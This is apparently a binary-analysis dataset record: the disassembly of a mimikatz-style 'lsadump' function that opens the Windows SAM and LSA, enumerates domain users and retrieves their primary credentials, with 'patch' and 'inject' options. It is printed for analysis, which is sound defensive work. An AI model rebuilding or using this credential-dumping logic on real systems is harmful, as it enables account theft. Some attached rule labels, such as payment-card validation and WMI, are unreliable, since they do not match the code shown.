{
  "address": "0x1400a2188",
  "rules": [
    "check for time delay via GetTickCount/dcdc41ab318e4e618f624ba5aeac30b2",
    "connect to WMI namespace via WbemLocator/50f8c95bd151440fa4fe29260efaf440",
    "contain loop",
    "validate payment card number using luhn algorithm with no lookup table/f595b07566ee46b3ba7870816078c34e"
  ],
  "disassembly": [
    "mov     r11, rsp",
    "mov     qword [r11+0x8], rbx",
    "push    rbp",
    "push    rsi",
    "push    rdi",
    "push    r12",
    "push    r13",
    "push    r14",
    "push    r15",
    "sub     rsp, 0x2d0",
    "xor     r15d, r15d",
    "lea     rbp, [rel data_14010cab8]  {u\"samsrv.dll\"}",
    "lea     rax, [rel data_140140240]",
    "mov     qword [r11-0x240], rax",
    "mov     qword [r11-0x250], rax",
    "lea     rax, [rel data_14010f2c0]  {\"SamIConnect\"}",
    "mov     qword [r11-0x210], rax",
    "mov     rax, 0x4141414141414141",
    "mov     r14d, ecx",
    "mov     qword [r11-0x208], rax",
    "lea     rax, [rel data_14010f2d0]  {\"SamrCloseHandle\"}",
    "lea     rcx, [rel data_14010ca68]  {u\"kernel32.dll\"}",
    "mov     qword [r11-0x1f0], rax",
    "mov     rax, 0x4242424242424242",
    "mov     r13, rdx",
    "mov     qword [r11-0x1e8], rax",
    "lea     rax, [rel data_14010f2e0]  {\"SamIRetrievePrimaryCredentials\"}",
    "mov     ebx, 0xc0000001",
    "mov     qword [r11-0x1d0], rax",
    "mov     rax, 0x4343434343434343",
    "mov     qword [rsp+0x78], r15",
    "mov     qword [r11-0x1c8], rax",
    "lea     rax, [rel data_14010f300]  {\"SamrOpenDomain\"}",
    "mov     dword [r11-0x278], r15d",
    "mov     qword [r11-0x1b0], rax",
    "mov     rax, 0x4444444444444444",
    "mov     qword [rsp+0x70], r15",
    "mov     qword [r11-0x1a8], rax",
    "lea     rax, [rel data_14010f310]  {\"SamrOpenUser\"}",
    "mov     qword [r11-0x280], r15",
    "mov     qword [r11-0x190], rax",
    "mov     rax, 0x4545454545454545",
    "mov     qword [r11-0x288], r15",
    "mov     qword [r11-0x188], rax",
    "lea     rax, [rel data_14010f320]  {\"SamrQueryInformationUser\"}",
    "mov     qword [r11-0x270], r15",
    "mov     qword [r11-0x170], rax",
    "mov     rax, 0x4646464646464646",
    "mov     qword [rsp+0x68], r15",
    "mov     qword [r11-0x168], rax",
    "lea     rax, [rel data_14010f340]  {\"SamIFree_SAMPR_USER_INFO_BUFFER\"}",
    "mov     rdi, r15",
    "mov     qword [r11-0x150], rax",
    "mov     rax, 0x4747474747474747",
    "mov     qword [rsp+0x60], r15",
    "mov     qword [r11-0x148], rax",
    "lea     rax, [rel data_14010f360]  {\"VirtualAlloc\"}",
    "mov     qword [r11-0x248], r15",
    "mov     qword [r11-0x130], rax",
    "mov     rax, 0x4a4a4a4a4a4a4a4a",
    "mov     qword [r11-0x258], r15",
    "mov     qword [r11-0x128], rax",
    "lea     rax, [rel data_1400f29e8]  {\"LocalFree\"}",
    "mov     r12, r15",
    "mov     qword [r11-0x110], rax",
    "mov     rax, 0x4b4b4b4b4b4b4b4b",
    "mov     qword [r11-0x218], rbp",
    "mov     qword [r11-0x108], rax",
    "lea     rax, [rel data_14010ca88]  {u\"ntdll.dll\"}",
    "mov     qword [r11-0x200], r15",
    "mov     qword [r11-0xf8], rax",
    "lea     rax, [rel data_14010f370]  {\"memcpy\"}",
    "mov     qword [r11-0x1f8], rbp",
    "mov     qword [r11-0xf0], rax",
    "mov     rax, 0x4c4c4c4c4c4c4c4c",
    "mov     qword [r11-0x1e0], r15",
    "mov     qword [r11-0x1d8], rbp",
    "mov     qword [r11-0x1c0], r15",
    "mov     qword [r11-0x1b8], rbp",
    "mov     qword [r11-0xe8], rax",
    "mov     qword [r11-0x1a0], r15",
    "mov     qword [r11-0x198], rbp",
    "mov     qword [r11-0x180], r15",
    "mov     qword [r11-0x178], rbp",
    "mov     qword [r11-0x160], r15",
    "mov     qword [r11-0x158], rbp",
    "mov     qword [r11-0x140], r15",
    "mov     qword [r11-0x138], rcx",
    "mov     qword [r11-0x120], r15",
    "mov     qword [r11-0x118], rcx",
    "mov     qword [r11-0x100], r15",
    "lea     rax, [rel data_14010f378]  {\"LocalAlloc\"}",
    "mov     dword [rsp+0xe0], 0xb",
    "mov     qword [r11-0xe0], r15",
    "mov     qword [r11-0xd0], rax",
    "mov     rax, 0x4d4d4d4d4d4d4d4d",
    "mov     qword [r11-0xd8], rcx",
    "mov     qword [r11-0xc8], rax",
    "lea     rax, [r11-0x218]",
    "mov     qword [r11-0xc0], r15",
    "mov     qword [r11-0x220], rax",
    "cmp     dword [rel data_1401403bc], r15d",
    "jne     0x1400a261a",
    "xor     edx, edx",
    "lea     rcx, [rsp+0x2a0]",
    "lea     r8d, [rdx+0x30]",
    "call    memset",
    "mov     ebp, 0x1",
    "lea     r9, [rsp+0xa8]",
    "lea     rdx, [rsp+0x2a0]",
    "mov     r8d, ebp",
    "xor     ecx, ecx",
    "call    LsaOpenPolicy",
    "cmp     eax, r15d",
    "jl      0x1400a2999",
    "lea     r8, [rel data_14010cb20]  {u\"patch\"}",
    "xor     r9d, r9d",
    "mov     ecx, r14d",
    "mov     qword [rsp+0x20], r15",
    "call    sub_140013220",
    "cmp     eax, r15d",
    "je      0x1400a258c",
    "cmp     r12, r15",
    "je      0x1400a29a6",
    "mov     rcx, qword [rsp+0xa8]",
    "lea     r8, [rsp+0x58]",
    "lea     edx, [rbp+0x4]",
    "call    LsaQueryInformationPolicy",
    "cmp     eax, r15d",
    "jl      0x1400a298c",
    "cmp     dword [rel data_1401403bc], r15d",
    "jne     0x1400a261a",
    "mov     edx, dword [rel data_14014084c]",
    "mov     rsi, r15",
    "lea     rax, [rel data_14013c050]",
    "mov     rcx, r15",
    "cmp     rdi, r15",
    "je      0x1400a29c5",
    "mov     rcx, r12",
    "call    sub_14000bb6c",
    "mov     rcx, qword [rsp+0xa8]",
    "call    LsaClose",
    "lea     rdx, [rsp+0xa0]",
    "xor     r9d, r9d",
    "mov     r8d, 0xf003f",
    "xor     ecx, ecx",
    "call    SamConnect",
    "cmp     eax, r15d",
    "mov     ebx, eax",
    "jl      0x1400a2974",
    "lea     r8, [rel data_14010f4b8]  {u\"inject\"}",
    "xor     r9d, r9d",
    "mov     rdx, r13",
    "mov     ecx, r14d",
    "mov     qword [rsp+0x20], r15",
    "call    sub_140013220",
    "cmp     eax, r15d",
    "je      0x1400a261a",
    "cmp     rsi, r15",
    "je      0x1400a29c5",
    "add     rcx, 0x50",
    "mov     rsi, rax",
    "add     rax, 0x50",
    "cmp     rcx, 0x230",
    "jb      0x1400a2465",
    "mov     eax, ebx",
    "mov     rbx, qword [rsp+0x310]",
    "add     rsp, 0x2d0",
    "pop     r15",
    "pop     r14",
    "pop     r13",
    "pop     r12",
    "pop     rdi",
    "pop     rsi",
    "pop     rbp",
    "retn    ",
    "mov     rcx, qword [rdi+0x8]",
    "cmp     qword [rcx], r15",
    "je      0x1400a29bd",
    "lea     rcx, [rel data_14010f7d0]  {u\"ERROR kuhl_m_lsadump_lsa ; SamCo\u2026\"}",
    "mov     edx, eax",
    "call    sub_14000c030",
    "mov     r8, qword [rsp+0x58]",
    "mov     rcx, qword [rsp+0xa0]",
    "lea     r9, [rsp+0x50]",
    "mov     r8, qword [r8+0x10]",
    "mov     edx, 0x705",
    "call    SamOpenDomain",
    "cmp     eax, r15d",
    "mov     ebx, eax",
    "jl      0x1400a2957",
    "lea     rcx, [rsp+0x60]",
    "mov     edx, 0x43a",
    "call    sub_1400a29e4",
    "mov     rdi, qword [rsp+0x60]",
    "cmp     eax, r15d",
    "je      0x1400a261a",
    "mov     rax, qword [rsi+0x10]",
    "lea     rcx, [rsp+0x60]",
    "mov     edx, 0x438",
    "mov     qword [rsp+0xc0], rax",
    "mov     rax, qword [rsi+0x20]",
    "mov     qword [rsp+0xb0], rax",
    "call    sub_1400a29e4",
    "mov     rdi, qword [rsp+0x60]",
    "cmp     eax, r15d",
    "je      0x1400a29a6",
    "cmp     dword [rax], edx",
    "ja      0x1400a247d",
    "mov     rcx, rdi",
    "call    sub_14000b660",
    "mov     rcx, qword [rcx]",
    "call    qword [rel CloseHandle]",
    "lea     rcx, [rel data_14010f770]  {u\"ERROR kuhl_m_lsadump_lsa ; SamOp\u2026\"}",
    "mov     edx, eax",
    "call    sub_14000c030",
    "mov     rdx, qword [rsp+0x58]",
    "lea     rcx, [rel data_14010f578]  {u\"Domain : %wZ / \"}",
    "call    sub_14000c030",
    "mov     rcx, qword [rsp+0x58]",
    "mov     rcx, qword [rcx+0x10]",
    "call    sub_14001311c",
    "lea     rcx, [rel data_1400d27a8]",
    "call    sub_14000c030",
    "lea     r9, [rsp+0x70]",
    "lea     r8, [rel data_140103344]",
    "mov     rdx, r13",
    "mov     ecx, r14d",
    "mov     qword [rsp+0x20], r15",
    "call    sub_140013220",
    "cmp     eax, r15d",
    "je      0x1400a27b1",
    "lea     rcx, [rsp+0x250]",
    "lea     r8, [rel sub_1400a67ac]",
    "lea     rdx, [rel sub_1400a5ebc]",
    "mov     qword [rsp+0x20], rcx",
    "lea     r9, [rsp+0xe0]",
    "mov     rcx, rdi",
    "sub     r8d, edx",
    "call    sub_14000f924",
    "cmp     eax, r15d",
    "je      0x1400a260e",
    "lea     r8, [rsp+0x260]",
    "mov     rdx, rbp",
    "mov     rcx, rdi",
    "call    sub_14000d0e0",
    "cmp     eax, r15d",
    "je      0x1400a2573",
    "mov     rcx, qword [rsp+0x58]",
    "call    LsaFreeMemory",
    "lea     r9, [rsp+0x88]",
    "lea     r8, [rel data_1401018a0]  {u\"name\"}",
    "mov     rdx, r13",
    "mov     ecx, r14d",
    "mov     qword [rsp+0x20], r15",
    "call    sub_140013220",
    "cmp     eax, r15d",
    "jne     0x1400a28b7",
    "mov     rcx, qword [rsp+0x70]",
    "xor     r8d, r8d",
    "xor     edx, edx",
    "call    qword [rel wcstoul]",
    "mov     dword [rsp+0x320], eax",
    "cmp     eax, r15d",
    "je      0x1400a279b",
    "lea     rcx, [rel data_14010f4d0]  {u\"ERROR kuhl_m_lsadump_lsa ; kull_\u2026\"}",
    "call    sub_14000c030",
    "lea     r12, [rsp+0x250]",
    "jmp     0x1400a261a",
    "call    qword [rel GetLastError]",
    "lea     rcx, [rel data_14010f400]  {u\"ERROR kuhl_m_lsadump_lsa ; kull_\u2026\"}",
    "mov     edx, eax",
    "call    sub_14000c030",
    "jmp     0x1400a29a6",
    "mov     eax, dword [rsp+0x270]",
    "mov     ecx, dword [rsi+0x18]",
    "movdqu  xmm0, xmmword [rsp+0x260]",
    "mov     r8d, dword [rsi+0x8]",
    "mov     qword [rsp+0x48], r15",
    "mov     qword [rsp+0x40], r13",
    "movdqu  xmmword [rsp+0x280], xmm0",
    "mov     qword [rsp+0x290], rax",
    "lea     rax, [rel sub_1400a2188]",
    "mov     dword [rsp+0x38], r14d",
    "mov     qword [rsp+0x30], rax",
    "mov     eax, dword [rsi+0x28]",
    "lea     r9, [rsp+0xb0]",
    "mov     dword [rsp+0x28], eax",
    "mov     qword [rsp+0x20], rcx",
    "lea     rdx, [rsp+0xc0]",
    "lea     rcx, [rsp+0x280]",
    "mov     ebp, 0x1",
    "mov     dword [rel data_1401403bc], ebp",
    "call    sub_14000c234",
    "cmp     eax, r15d",
    "jne     0x1400a2567",
    "mov     rdx, qword [rsp+0x88]",
    "lea     rcx, [rsp+0xd0]",
    "call    RtlInitUnicodeString",
    "mov     rcx, qword [rsp+0x50]",
    "lea     r11, [rsp+0x68]",
    "lea     r9, [rsp+0x98]",
    "lea     r8, [rsp+0xd0]",
    "mov     edx, ebp",
    "mov     qword [rsp+0x20], r11",
    "call    SamLookupNamesInDomain",
    "cmp     eax, r15d",
    "mov     ebx, eax",
    "jl      0x1400a293d",
    "lea     r9, [rsp+0x88]",
    "lea     r8, [rel data_140103338]  {u\"user\"}",
    "mov     rdx, r13",
    "mov     ecx, r14d",
    "mov     qword [rsp+0x20], r15",
    "call    sub_140013220",
    "cmp     eax, r15d",
    "jne     0x1400a28b7",
    "mov     rdx, qword [rsp+0x70]",
    "lea     rcx, [rel data_14010f610]  {u\"ERROR kuhl_m_lsadump_lsa ; '%s' \u2026\"}",
    "call    sub_14000c030",
    "jmp     0x1400a294b",
    "mov     rcx, qword [rsp+0x50]",
    "lea     rax, [rsp+0x68]",
    "lea     r9, [rsp+0x80]",
    "lea     r8, [rsp+0x320]",
    "mov     edx, ebp",
    "mov     qword [rsp+0x20], rax",
    "call    SamLookupIdsInDomain",
    "cmp     eax, r15d",
    "mov     ebx, eax",
    "jl      0x1400a278f",
    "mov     dword [rel data_1401403bc], r15d",
    "jmp     0x1400a29a6",
    "call    qword [rel GetLastError]",
    "lea     rcx, [rel data_14010f390]  {u\"ERROR kuhl_m_lsadump_lsa ; kull_\u2026\"}",
    "mov     edx, eax",
    "call    sub_14000c030",
    "lea     rcx, [rel data_14010f680]  {u\"ERROR kuhl_m_lsadump_lsa ; SamLo\u2026\"}",
    "mov     rax, qword [rsp+0x98]",
    "mov     rdx, qword [rsp+0x58]",
    "mov     rcx, qword [rsp+0x50]",
    "mov     r8d, dword [rax]",
    "mov     rdx, qword [rdx+0x10]",
    "lea     r9, [rsp+0xd0]",
    "mov     qword [rsp+0x20], r12",
    "call    sub_1400a2ab4",
    "mov     rcx, qword [rsp+0x98]",
    "mov     rcx, qword [rsp+0x50]",
    "lea     rax, [rsp+0x328]",
    "lea     r9, [rsp+0x78]",
    "mov     qword [rsp+0x28], rax",
    "lea     rdx, [rsp+0x90]",
    "xor     r8d, r8d",
    "mov     dword [rsp+0x20], 0x64",
    "call    SamEnumerateUsersInDomain",
    "cmp     eax, r15d",
    "mov     esi, eax",
    "jge     0x1400a284e",
    "mov     rcx, qword [rsp+0x50]",
    "call    SamCloseHandle",
    "jmp     0x1400a2965",
    "lea     rcx, [rel data_14010f5a0]  {u\"ERROR kuhl_m_lsadump_lsa ; SamLo\u2026\"}",
    "jmp     0x1400a2944",
    "mov     rdx, qword [rsp+0x58]",
    "mov     r9, qword [rsp+0x80]",
    "mov     r8d, dword [rsp+0x320]",
    "mov     rdx, qword [rdx+0x10]",
    "mov     rcx, qword [rsp+0x50]",
    "mov     qword [rsp+0x20], r12",
    "call    sub_1400a2ab4",
    "mov     rcx, qword [rsp+0x80]",
    "jmp     0x1400a292c",
    "mov     rcx, qword [rsp+0xa0]",
    "call    SamCloseHandle",
    "jmp     0x1400a2982",
    "mov     r13d, r15d",
    "cmp     dword [rsp+0x328], r15d",
    "jbe     0x1400a289c",
    "cmp     eax, 0x105",
    "je      0x1400a284e",
    "mov     edx, eax",
    "call    sub_14000c030",
    "call    SamFreeMemory",
    "mov     rcx, qword [rsp+0x68]",
    "call    SamFreeMemory",
    "jmp     0x1400a294b",
    "mov     rcx, qword [rsp+0x78]",
    "call    SamFreeMemory",
    "mov     r14, r15",
    "lea     rcx, [rel data_14010f6f0]  {u\"ERROR kuhl_m_lsadump_lsa ; SamEn\u2026\"}",
    "mov     edx, eax",
    "call    sub_14000c030",
    "jmp     0x1400a28a6",
    "jmp     0x1400a294b",
    "mov     rdx, qword [rsp+0x58]",
    "mov     eax, r13d",
    "mov     qword [rsp+0x20], r12",
    "mov     rdx, qword [rdx+0x10]",
    "lea     rcx, [rax+rax*2]",
    "mov     rax, qword [rsp+0x78]",
    "mov     r8d, dword [r14+rax]",
    "lea     r9, [rax+rcx*8+0x8]",
    "mov     rcx, qword [rsp+0x50]",
    "call    sub_1400a2ab4",
    "add     r13d, ebp",
    "add     r14, 0x18",
    "cmp     r13d, dword [rsp+0x328]",
    "jb      0x1400a285e",
    "cmp     esi, 0x105",
    "je      0x1400a2801"
  ],
  "high_level_IL": [
    "No High Level IL Loaded"
  ]
}